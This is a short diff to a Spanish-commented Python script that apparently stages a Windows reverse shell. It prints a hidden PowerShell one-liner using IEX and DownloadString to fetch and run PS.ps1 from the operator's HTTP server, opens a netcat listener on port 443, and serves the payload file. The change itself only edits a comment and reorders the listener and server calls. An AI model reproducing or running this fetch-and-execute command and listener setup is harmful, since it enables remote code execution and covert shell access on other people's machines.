@@ -4,7 +4,7 @@ import subprocess
 import http.server
 import socketserver
 
-puerto = 8080  # Declarar la variable puerto aquí
+puerto = 8080  # Puerto para levantar el servicio
 netcat_puerto = 443  # Puerto para netcat
 
 # Función para obtener los adaptadores de red y sus IPs usando ifconfig
@@ -117,10 +117,10 @@ if adaptadores_ips:
         print(f"powershell -w hidden \"IEX(New-Object Net.WebClient).downloadString('http://{ip_actual}:{puerto}/PS.ps1')\"")
         print("****************************************************************")
         
-        # Levantar servidor HTTP para compartir el archivo .ps1
-
         # Abrir netcat en una nueva terminal
         abrir_netcat()
+
+        # Levantar servidor HTTP para compartir el archivo .ps1
         levantar_servidor()
 
     else:
